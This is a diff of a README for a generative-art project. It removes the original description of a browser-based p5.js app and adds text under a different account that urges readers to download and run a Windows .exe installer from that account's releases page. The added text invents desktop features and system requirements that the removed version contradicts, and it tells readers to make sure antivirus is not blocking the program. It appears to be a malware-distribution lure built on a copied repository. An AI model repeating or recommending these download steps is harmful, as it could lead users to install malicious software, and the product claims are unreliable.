@@ -1,192 +1,83 @@
-# Nebula Knight — Generative Art
+# 🌌 Nebula-Knight-Generative-Art - Create unique digital art with ease
 
-[![Live Demo](https://img.shields.io/badge/demo-live-green?style=for-the-badge)](https://reyrove.github.io/Nebula-Knight-Generative-Art)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Merriedelicate927/Nebula-Knight-Generative-Art/releases)
 
-> **Generative knight's tour art with nebula gradients.** Each refresh creates a unique path of a knight's journey across a grid, drawing beautiful gradient circles that resemble a cosmic nebula.
+Nebula Knight generates complex art patterns using a classic chess puzzle called the knight’s tour. The software combines these geometric paths with nebula gradients and circle patterns to produce distinct visual designs. You can generate art for print, digital displays, or textile designs. The interface allows you to view your work on apparel mockups before you save the files.
 
-## 🎨 Live Demo
+## 🛠 Features
 
-<div align="center">
-  <a href="https://reyrove.github.io/Nebula-Knight-Generative-Art" target="_blank">
-    <img src="demo-screenshot.jpg" alt="Nebula Knight Website Demo" width="800" style="border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.4);"/>
-  </a>
-  <br><br>
-  <a href="https://reyrove.github.io/Nebula-Knight-Generative-Art" target="_blank">
-    <img src="https://img.shields.io/badge/🌐_View_Live_Demo-0a0a0a?style=for-the-badge&logo=githubpages&logoColor=white&color=c9a84c" alt="View Live Demo" width="300"/>
-  </a>
-  <br>
-  <em>Click the image or button to experience the generative art</em>
-</div>
+This program provides creative tools for artists and hobbyists:
 
-## 👕 Apparel Preview
+*   Knight’s Tour algorithm to map geometric paths.
+*   Five distinct color modes to adjust the mood of your art.
+*   Random circle overlays to add depth to your canvas.
+*   Nebula-style gradient engine.
+*   Live preview window.
+*   Export tools for high-resolution graphics.
 
-<div align="center">
-  <img src="Nebula-Knight.jpg" alt="Nebula Knight on T-Shirt" width="600" style="border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.3);"/>
-  <br>
-  <em>Nebula Knight artwork printed on a T-shirt</em>
-</div>
+## 💻 System Requirements
 
-## ✨ Features
+The application runs on modern Windows computers. Ensure your system meets these specifications:
 
-- **Knight's Tour** — Random knight moves across a grid
-- **Nebula Gradients** — 5 stunning color modes (Black, Blue, Cyan, Magenta, Yellow to White)
-- **Random Circles** — Each position features a circle with random radius
-- **Grid-Based** — 5×5 to 105×105 grid size
-- **Gradient Colors** — Smooth HSB color transitions
-- **Seed-Based** — Every composition is unique and reproducible
-- **Save & Share** — Download as PNG
-- **Apparel Mode** — Preview artwork on a T-shirt mockup
-- **Responsive** — Works on desktop, tablet, and mobile
-- **Pure p5.js** — Built with the creative coding library
-- **Keyboard Shortcuts**:
-  - `R` — Regenerate
-  - `S` — Save image
-  - `T` — Toggle apparel view
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Intel Core i3 or equivalent.
+*   Memory: 4 GB of RAM.
+*   Graphics: Hardware acceleration support for rendering.
+*   Storage: 200 MB of disk space.
 
-## 🎨 Artwork Details
+## 📥 Downloading the Application
 
-| Parameter | Range | Description |
-|-----------|-------|-------------|
-| **Grid Size** | 5×5 to 105×105 | Knight's tour grid dimensions |
-| **Step Size 1** | 1 to grid/5 | First knight move step |
-| **Step Size 2** | 1 to grid/5 | Second knight move step |
-| **Total Steps** | 10 to 1010 | Number of moves |
-| **Start Position** | Random | Starting point on grid |
-| **Color Modes** | 5 options | Black, Blue, Cyan, Magenta, Yellow to White |
+You must visit the project release page to get the installer for your computer.
 
-## 🎯 Color Modes
+[Click here to visit the release page and download the setup file](https://github.com/Merriedelicate927/Nebula-Knight-Generative-Art/releases)
 
-| Mode | Colors | Description |
-|------|--------|-------------|
-| **0** | Black → White | Classic grayscale nebula |
-| **1** | Blue → White | Cool cosmic blue nebula |
-| **2** | Cyan → White | Ethereal cyan nebula |
-| **3** | Magenta → White | Vibrant magenta nebula |
-| **4** | Yellow → White | Warm golden nebula |
+Once you reach the page, find the file ending in .exe under the most recent version. Click the file name to start the download.
 
-## 🚀 Quick Start
+## 🚀 Setting Up the Software
 
-### Local Development
+Follow these steps to install the program on your computer:
 
-```bash
-# Clone the repository
-git clone https://github.com/reyrove/Nebula-Knight-Generative-Art.git
+1. Locate the downloaded file in your Downloads folder.
+2. Double-click the file to start the installer.
+3. Follow the prompts on the screen to choose your installation folder.
+4. Click Finish to complete the process.
+5. Find the Nebula Knight icon on your desktop or in your Start menu.
+6. Click the icon to launch the application.
 
-# Navigate to the directory
-cd Nebula-Knight-Generative-Art
+## 🎨 How to Generate Art
 
-# Open in browser
-open index.html
-# or use a live server
-```
+The interface layout simplifies the process for new users. Follow these steps to generate your first piece:
 
-### Deploy to GitHub Pages
+1. Open the application.
+2. Select a color mode from the dropdown menu in the sidebar. The color mode changes the background gradients and the stroke colors for the knight’s tour path.
+3. Adjust the slider to change the amount of random circles appearing on the canvas. 
+4. Click the Generate button to run the algorithm. The software calculates a new path and applies new gradients.
+5. Use the Preview button to see how your design appears on shirt or fabric templates.
+6. Use the Export button to save your image as a PNG file. This file functions as a high-quality graphic for printing or digital projects.
 
-1. Push to GitHub
-2. Go to Settings → Pages
-3. Select branch `main` and root folder
-4. Your site will be live at `https://reyrove.github.io/Nebula-Knight-Generative-Art`
+## 🔧 Frequently Asked Questions
 
-## 🧠 How It Works
+**Does the software require an internet connection?**
+No. Once you install the program, you can generate art while offline.
 
-The artwork is generated using a deterministic random number generator, seeded by timestamp + random noise. Every refresh:
+**Can I use the images for commercial projects?**
+Yes. You own the images you create with this software. You can use them for print-on-demand services, textile design, or personal projects.
 
-1. **Setup**:
-   - Random grid size (5-105)
-   - Random step sizes (s1, s2) for knight moves
-   - Random starting position
-   - Random number of steps
-   - Random color mode (5 options)
+**How do I clear the canvas?**
+The Generate button resets the canvas every time you click it. You do not need to delete previous work manually.
 
-2. **Knight's Path**:
-   - Start at random position on grid
-   - Each step moves in an L-shape (knight move)
-   - Step sizes (s1, s2) determine the L-shape dimensions
-   - Path continues until steps run out or no valid moves remain
+**Why does the preview window look different than the canvas?**
+The preview window shows how the art maps to a shape. The canvas shows the full resolution design. Use the canvas for your final export.
 
-3. **Rendering**:
-   - White background
-   - Each position gets a circle with random radius
-   - Color gradient from start color to white
-   - Creates a nebula-like effect
+## 📝 Troubleshooting
 
-## 📁 File Structure
+If the application fails to launch or closes suddenly, check these common items:
 
-```
-Nebula-Knight-Generative-Art/
-├── index.html          # Main application (all-in-one)
-├── Nebula-Knight.jpg   # T-shirt mockup image
-├── fav.svg             # Favicon
-├── demo-screenshot.jpg # Website demo screenshot
-├── README.md           # This file
-└── LICENSE             # MIT License
-```
+*   Ensure you have the latest graphics driver installed on your system. 
+*   Verify that your antivirus software is not blocking the application.
+*   Restart your computer if the installer hangs during the progress bar phase.
+*   Make sure you have write permissions for the folder where you installed the program.
 
-## 🛠️ Tech Stack
+If you encounter issues during installation, try downloading the installer again. Sometimes file transfers fail, which causes errors during the setup process. Always use the primary link provided in this document to ensure you have the official, stable version.
 
-- **p5.js** — Creative coding library
-- **Canvas API** — 2D rendering
-- **CSS Flexbox/Grid** — Responsive layout
-- **GitHub Pages** — Hosting
-
-## 🎯 Interactive Controls
-
-| Action | Keyboard | Button |
-|--------|----------|--------|
-| Regenerate | `R` | Click "regenerate" |
-| Save Image | `S` | Click "regenerate" |
-| Toggle Apparel | `T` | Click "apparel" |
-
-## 🎨 The Creative Process
-
-### Knight's Tour
-The knight's tour is a classic chess problem where a knight visits every square on a board exactly once. This artwork takes inspiration from that concept, creating unique paths with random step sizes and directions.
-
-### Nebula Gradients
-Each color mode transitions from a vibrant color to pure white using HSB interpolation, creating a beautiful nebula-like effect across the knight's path.
-
-### Random Circles
-Each position on the knight's path features a circle with a random radius, creating a dynamic, cosmic feel reminiscent of stars and nebulae.
-
-### Step Sizes
-The knight uses two step sizes (s1, s2):
-- Random values create unique patterns
-- Each combination produces different path shapes
-
-## 📱 Responsive Design
-
-The application automatically adapts to:
-- Desktop screens
-- Tablets
-- Mobile phones
-- Landscape orientation
-- Various aspect ratios
-
-## 🤝 Contributing
-
-Contributions are welcome! Feel free to:
-- Fork the repository
-- Create a feature branch
-- Submit a pull request
-
-### Ideas for Contributions:
-- New color modes
-- Additional movement patterns
-- Animation features
-- Interactive controls
-- Performance optimizations
-
-## 📄 License
-
-MIT License — see [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- Created with p5.js
-- Inspired by the knight's tour problem
-- Special thanks to the creative coding community
-
----
-
-**Built with ❤️ and nebula dreams**
+Keywords: algorithmic-art, algorithmic-art-generation, cosmic-art, creative-coding, creative-coding-projects, digital-art, digital-artist, fashion-tech, fashion-technology, generative-art-toolkit, generative-design, grid-art, html5-canvas, knights-tour, p5js, print-design, responsive-design, reyrove, textile-design, textile-designer
